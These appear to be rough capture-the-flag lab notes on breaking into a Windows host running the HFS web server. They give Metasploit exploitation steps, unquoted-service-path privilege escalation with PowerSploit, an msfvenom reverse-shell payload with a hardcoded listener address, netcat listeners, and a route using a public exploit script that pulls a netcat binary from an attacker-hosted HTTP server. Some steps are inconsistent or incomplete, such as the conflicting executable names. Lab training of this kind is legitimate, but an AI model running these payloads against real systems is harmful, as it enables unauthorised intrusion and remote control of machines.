# nmap scan 

# enumerate 80 and 8080

# nikto -> server type HFS

# msfconsole -

* Search Vuln
* set ports including lhost as tun0
* exploit -> meterpreter

# Escalate with metasploit

* Upload privec script -> Powersploit `upload <scriptPath>`
* `load powershell`
* `powershell_shell` loads shell
* load script `. .\Script`
* `Invoke-AllChecks`
```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
* Check for can restart and get name.exe for exploit
* sc stop AdvancedSystemCareService9 and 
* copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
* sc start AdvancedSystemCareService9
* `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.33.220 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe`
* Upload the payload
* Drop shell stop the service
* listen on Payload port nc -lnvp 

# Without meterpreter

`Find expoit`
`Configure ip and ports`
`get required things`
`host on python`
Terminal 1 - python HTTP web server

`python -m SimpleHTTPServer 80`

Terminal 2 - netcat listener

`nc -lnvp 1443`

Terminal 3 -  to execute the attack

`python 39161.py 10.10.125.153 8080`

Note: the final command needs to be run TWICE - the first instance will pull the netcat binary to the target and the second will execute the payload to gain a callback within the listener. 

` powershell -c wget"url/file"

# Explanation 

```
If you've gotten to this point and are somewhat confused about what Unquoted Service Paths are, that's ok.  In a nutshell, USP are a misconfiguration in a directory's path that contains spaces in which the path isn't encapsulated in double quotations.  If the path to an executable is "quoted,"  the path is specifically defined in the machine and not open to interpretation usually.  If the path is not quoted, then you can maliciously insert executables in to the "spaces."  This link provides a pretty good overview of what is going on to cause these vulnerabilities.  

From here we need to determine the locations within the service path that can be exploited.  We see that in this case we could try C:\Program Files (x86), and try to inject something named Program.exe, but we likely do not have permission to do so.  However we know that we have permission to modify the service as we have privileges to run it (StartName: LocalSystem).

Now that we know that we have privileges, and that we have a possible path to inject our malicious executable in to, we need to craft it.  We can use msfvenom to do this.  Keep note that the service path we are targeting is Advanced SystemCare, so we will need to name our malicious executable "Advanced.exe" as this is what the system will attempt to run first.  We also need to start a Multi Handler to catch our reverse shell.  So let's do these in order.```